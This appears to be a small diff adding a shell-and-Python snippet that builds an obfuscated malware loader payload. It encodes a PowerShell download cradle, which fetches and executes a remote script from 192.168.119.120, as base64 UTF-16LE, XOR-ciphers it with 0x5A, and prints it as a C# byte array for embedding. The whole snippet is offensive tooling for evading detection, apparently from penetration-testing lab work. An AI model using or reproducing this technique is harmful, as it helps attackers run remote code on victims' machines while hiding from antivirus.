@@ -1,0 +1,9 @@
+python3 - <<'PY'
+import base64
+cmd = "iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
+b64 = base64.b64encode(cmd.encode('utf-16-le')).decode()
+ciphered = [b ^ 0x5A for b in b64.encode('utf-8')]
+print("static byte[] ciphered = new byte[] {")
+print(",".join(f"0x{b:02x}" for b in ciphered))
+print("};")
+PY
